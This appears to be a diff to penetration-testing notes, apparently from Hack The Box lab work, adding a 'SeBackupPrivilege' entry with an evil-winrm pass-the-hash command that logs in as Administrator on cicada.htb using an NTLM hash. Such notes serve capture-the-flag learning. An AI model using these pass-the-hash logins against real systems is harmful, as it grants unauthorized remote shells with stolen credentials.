@@ -19,3 +19,7 @@ Example
 evil-winrm -i $IP -u recourced.local\\L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
 ```
 
+SeBackupPrivilege
+```
+evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
+```
